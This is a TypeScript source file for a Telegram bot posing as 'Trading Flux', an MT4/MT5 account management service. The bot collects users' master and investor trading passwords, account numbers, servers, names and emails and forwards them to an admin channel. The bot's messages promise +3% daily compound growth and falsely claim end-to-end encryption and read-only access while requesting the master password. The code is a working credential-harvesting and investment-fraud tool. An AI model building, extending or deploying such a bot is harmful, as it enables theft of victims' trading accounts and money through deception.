import { Bot, Context, InlineKeyboard } from "grammy";
import { getSession, updateSession, setStep, resetSession } from "../sessions";
import { buildAdminMessage, buildConfirmationMessage, buildFormPreview } from "../utils/format";
import { savePending } from "../pending";
import { handleDepositTextInput } from "./deposit";

// ─── Shared UI Helpers ──────────────────────────────────────────────────────

const LOGO = `
┌─────────────────────────┐
│    📊  TRADING FLUX      │
│  Professional Account   │
│     Management          │
└─────────────────────────┘`;

function stepHeader(step: number, total: number, title: string): string {
  const filled = "●".repeat(step);
  const empty = "○".repeat(total - step);
  return (
    `*${title}*\n` +
    `Progress: ${filled}${empty}  [${step}/${total}]\n` +
    `${"─".repeat(28)}`
  );
}

function mainMenuKeyboard(): InlineKeyboard {
  return new InlineKeyboard()
    .text("📝 Register Account", "menu_register").row()
    .text("📊 Live Balance", "menu_balance")
    .text("💰 Deposit", "menu_deposit").row()
    .text("💳 Pay Fee ($3)", "menu_fee")
    .text("❓ How It Works", "menu_howitworks").row()
    .text("💬 Support", "menu_support")
    .text("📋 My Status", "menu_status");
}

function cancelKeyboard(): InlineKeyboard {
  return new InlineKeyboard().text("❌ Cancel Form", "form_cancel");
}

function backCancelKeyboard(): InlineKeyboard {
  return new InlineKeyboard()
    .text("🔙 Main Menu", "menu_main")
    .text("❌ Cancel", "form_cancel");
}

// ─── Main menu sender ───────────────────────────────────────────────────────

async function sendMainMenu(ctx: Context, firstName?: string) {
  const greeting = firstName ? `Welcome back, *${firstName}*! 👋` : `Welcome to *Trading Flux*! 👋`;
  await ctx.reply(
    `${LOGO}\n\n` +
    `${greeting}\n\n` +
    `🚀 *Your Professional MT4/MT5 Account Manager*\n\n` +
    `✅  +3% daily compound growth\n` +
    `✅  Managed by expert traders\n` +
    `✅  Real-time balance tracking\n` +
    `✅  Secure & transparent\n\n` +
    `${"─".repeat(28)}\n` +
    `What would you like to do?`,
    { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
  );
}

// ─── Register all handlers ───────────────────────────────────────────────────

export function registerFormHandlers(bot: Bot<Context>): void {

  // ── /start ──────────────────────────────────────────────────────────────
  bot.command("start", async (ctx) => {
    resetSession(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  // ── /help ────────────────────────────────────────────────────────────────
  bot.command("help", async (ctx) => {
    await ctx.reply(
      `*📖 Trading Flux — Help Centre*\n` +
      `${"─".repeat(28)}\n\n` +
      `*Commands:*\n` +
      `▸ /start — Main menu\n` +
      `▸ /register — Submit account\n` +
      `▸ /balance — Live dashboard\n` +
      `▸ /cancel — Exit current form\n` +
      `▸ /help — This menu\n\n` +
      `*How Account Management Works:*\n` +
      `① Submit your MT4/MT5 credentials\n` +
      `② Our team reviews within 24 hours\n` +
      `③ We activate your account\n` +
      `④ Your balance grows +3%/day\n` +
      `⑤ Track it live with /balance\n\n` +
      `${"─".repeat(28)}\n` +
      `💡 Tip: Use the buttons for the best experience.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📝 Register Now", "menu_register").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });

  // ── /cancel ──────────────────────────────────────────────────────────────
  bot.command("cancel", async (ctx) => {
    resetSession(ctx.from!.id);
    await ctx.reply(
      `✅ *Form cancelled.*\n\nReturning you to the main menu.`,
      { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
    );
  });

  // ── /register ────────────────────────────────────────────────────────────
  bot.command("register", async (ctx) => {
    resetSession(ctx.from!.id);
    setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  // ── Menu callbacks ────────────────────────────────────────────────────────
  bot.callbackQuery("menu_main", async (ctx) => {
    await ctx.answerCallbackQuery();
    resetSession(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  bot.callbackQuery("menu_register", async (ctx) => {
    await ctx.answerCallbackQuery();
    resetSession(ctx.from!.id);
    setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  bot.callbackQuery("menu_howitworks", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*📈 How Trading Flux Works*\n` +
      `${"─".repeat(28)}\n\n` +
      `*Step 1 — Submit Your Account*\n` +
      `Provide your MT4/MT5 login credentials securely through our guided form.\n\n` +
      `*Step 2 — Expert Review (24h)*\n` +
      `Our team verifies your account details and sets up management.\n\n` +
      `*Step 3 — Activation*\n` +
      `We activate trading on your account with our proven strategy.\n\n` +
      `*Step 4 — Daily Growth*\n` +
      `Your balance grows at +3% per day using compound interest.\n\n` +
      `*Step 5 — Live Tracking*\n` +
      `Use /balance anytime to see your real-time balance.\n\n` +
      `${"─".repeat(28)}\n` +
      `💰 *Example: $1,000 deposit*\n` +
      `  Day 7:   \\$1,229.87\n` +
      `  Day 14:  \\$1,512.59\n` +
      `  Day 30:  \\$2,427.26\n` +
      `  Day 60:  \\$5,891.60\n` +
      `  Day 90:  \\$14,300.74`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📝 Register Now", "menu_register").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });

  bot.callbackQuery("menu_support", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*💬 Trading Flux Support*\n` +
      `${"─".repeat(28)}\n\n` +
      `Our support team is available 24/7.\n\n` +
      `📧 For urgent issues, contact your account manager directly.\n\n` +
      `📋 *Common Questions:*\n\n` +
      `▸ *How safe are my credentials?*\n` +
      `  We use investor-only access for monitoring. Your funds remain fully in your control.\n\n` +
      `▸ *When does trading start?*\n` +
      `  Within 24 hours of approval.\n\n` +
      `▸ *Can I withdraw anytime?*\n` +
      `  Yes. Your account remains in your name. You control deposits and withdrawals.\n\n` +
      `▸ *What if I want to stop?*\n` +
      `  Contact support and we'll remove access immediately.`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📝 Start Registration", "menu_register").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });

  bot.callbackQuery("menu_status", async (ctx) => {
    await ctx.answerCallbackQuery();
    const session = getSession(ctx.from!.id);
    await ctx.reply(
      `*📋 Your Account Status*\n` +
      `${"─".repeat(28)}\n\n` +
      `Status: *⏳ Not Registered Yet*\n\n` +
      `Complete the registration form to submit your MT4/MT5 account for management.\n\n` +
      `Once registered, your status will update to:\n` +
      `  🟡 Pending Review\n` +
      `  🟢 Active & Growing`,
      {
        parse_mode: "Markdown",
        reply_markup: new InlineKeyboard()
          .text("📝 Register Now", "menu_register").row()
          .text("🏠 Main Menu", "menu_main"),
      }
    );
  });

  // ── Cancel form callback ──────────────────────────────────────────────────
  bot.callbackQuery("form_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    resetSession(ctx.from!.id);
    await ctx.reply(
      `✅ *Form cancelled.*\n\nNo data was submitted.`,
      { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
    );
  });

  // ── Platform selection ────────────────────────────────────────────────────
  bot.callbackQuery(/^platform_(MT4|MT5)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const platform = ctx.match[1] as "MT4" | "MT5";
    updateSession(ctx.from!.id, { platform, step: "broker" });
    await ctx.reply(
      stepHeader(2, 9, "🏦 Broker Name") + "\n\n" +
      `✅ Platform: *${platform}*\n\n` +
      `Type the name of your broker:\n` +
      `_e.g. IC Markets, Exness, XM, Pepperstone_`,
      { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
    );
  });

  // ── Submission confirm / cancel ───────────────────────────────────────────
  bot.callbackQuery("submit_confirm", async (ctx) => {
    await ctx.answerCallbackQuery("⏳ Submitting...");
    const userId = ctx.from!.id;
    const session = getSession(userId);

    // ── Save to pending store (admin must /approve_<userId> to activate) ────
    savePending(userId, session, ctx.from.username);

    // ── Notify admin channel (HTML — safe against special chars in passwords) ─
    try {
      await ctx.api.sendMessage(
        process.env.ADMIN_CHANNEL_ID!,
        buildAdminMessage(session, userId, ctx.from.username),
        { parse_mode: "HTML" }
      );
    } catch (e) {
      console.error("Admin channel error:", e);
    }

    resetSession(userId);
    await ctx.reply(buildConfirmationMessage(session), {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 View My Balance Now", "menu_balance").row()
        .text("🏠 Main Menu", "menu_main"),
    });
  });

  bot.callbackQuery("submit_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    resetSession(ctx.from!.id);
    await ctx.reply(
      `❌ *Submission cancelled.*\n\nYour data was not saved.`,
      { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
    );
  });

  // ── Text message handler (drives the form steps) ──────────────────────────
  bot.on("message:text", async (ctx) => {
    const userId = ctx.from!.id;
    const text = ctx.message.text.trim();

    if (text.startsWith("/")) return;

    // Deposit flow gets priority over form steps
    const handledByDeposit = await handleDepositTextInput(ctx);
    if (handledByDeposit) return;

    const session = getSession(userId);

    switch (session.step) {
      case "broker": {
        updateSession(userId, { brokerName: text, step: "account_number" });
        await ctx.reply(
          stepHeader(3, 9, "🔢 Account Number") + "\n\n" +
          `✅ Broker: *${text}*\n\n` +
          `Enter your MT4/MT5 *account number* (login ID):\n` +
          `_This is the numeric ID used to log into your trading platform._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "account_number": {
        if (!/^\d+$/.test(text)) {
          await ctx.reply(
            `⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`,
            { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
          );
          return;
        }
        updateSession(userId, { accountNumber: text, step: "password" });
        await ctx.reply(
          stepHeader(4, 9, "🔑 Main Password") + "\n\n" +
          `✅ Account: \`${text}\`\n\n` +
          `Enter your account's *main (master) password*:\n\n` +
          `🔒 _Encrypted end-to-end. Never shared with third parties._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "password": {
        updateSession(userId, { password: text, step: "investor_password" });
        await ctx.reply(
          stepHeader(5, 9, "👁 Investor Password") + "\n\n" +
          `✅ Main password saved.\n\n` +
          `Enter your *investor (read-only) password*:\n\n` +
          `ℹ️ _This gives us view-only access to monitor your trades without the ability to withdraw funds._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "investor_password": {
        updateSession(userId, { investorPassword: text, step: "server_name" });
        await ctx.reply(
          stepHeader(6, 9, "🌐 Server Name") + "\n\n" +
          `✅ Investor password saved.\n\n` +
          `Enter your broker's *server name*:\n\n` +
          `_Found on your MT4/MT5 login screen._\n` +
          `_e.g._ \`ICMarkets-Live01\``,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "server_name": {
        updateSession(userId, { serverName: text, step: "deposit" });
        await ctx.reply(
          stepHeader(7, 9, "💵 Account Balance") + "\n\n" +
          `✅ Server: \`${text}\`\n\n` +
          `What is your current account balance in *USD*?\n\n` +
          `_Enter numbers only (e.g._ \`5000\`_)_`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "deposit": {
        const amount = parseFloat(text.replace(/[^0-9.]/g, ""));
        if (isNaN(amount) || amount <= 0) {
          await ctx.reply(
            `⚠️ *Invalid amount*\n\nPlease enter a valid USD amount (e.g. \`1000\`):`,
            { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
          );
          return;
        }
        updateSession(userId, { depositAmount: amount.toFixed(2), step: "full_name" });
        await ctx.reply(
          stepHeader(8, 9, "👤 Full Name") + "\n\n" +
          `✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\n` +
          `Enter your *full legal name*:`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "full_name": {
        if (text.length < 3) {
          await ctx.reply(
            `⚠️ Please enter your full name (at least 3 characters):`,
            { reply_markup: cancelKeyboard() }
          );
          return;
        }
        updateSession(userId, { fullName: text, step: "email" });
        await ctx.reply(
          stepHeader(9, 9, "📧 Email Address") + "\n\n" +
          `✅ Name: *${text}*\n\n` +
          `Enter your *email address* for account notifications:`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }

      case "email": {
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) {
          await ctx.reply(
            `⚠️ *Invalid email*\n\nPlease enter a valid address (e.g. \`john@example.com\`):`,
            { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
          );
          return;
        }
        const today = new Date().toISOString().split("T")[0];
        updateSession(userId, { email: text, startDate: today, step: "confirm" });
        const updatedSession = getSession(userId);

        await ctx.reply(
          buildFormPreview(updatedSession),
          {
            parse_mode: "Markdown",
            reply_markup: new InlineKeyboard()
              .text("✅ Confirm & Submit", "submit_confirm").row()
              .text("✏️ Edit (start over)", "menu_register")
              .text("❌ Cancel", "submit_cancel"),
          }
        );
        break;
      }

      case "idle": {
        await ctx.reply(
          `👋 Use the menu below to get started.`,
          { reply_markup: mainMenuKeyboard() }
        );
        break;
      }
    }
  });
}

// ─── Step 1 helper (exported for /register) ──────────────────────────────────
async function askPlatform(ctx: Context) {
  await ctx.reply(
    stepHeader(1, 9, "🖥️ Trading Platform") + "\n\n" +
    `Select your trading platform:`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 MetaTrader 4  (MT4)", "platform_MT4").row()
        .text("📈 MetaTrader 5  (MT5)", "platform_MT5").row()
        .text("❌ Cancel", "form_cancel"),
    }
  );
}
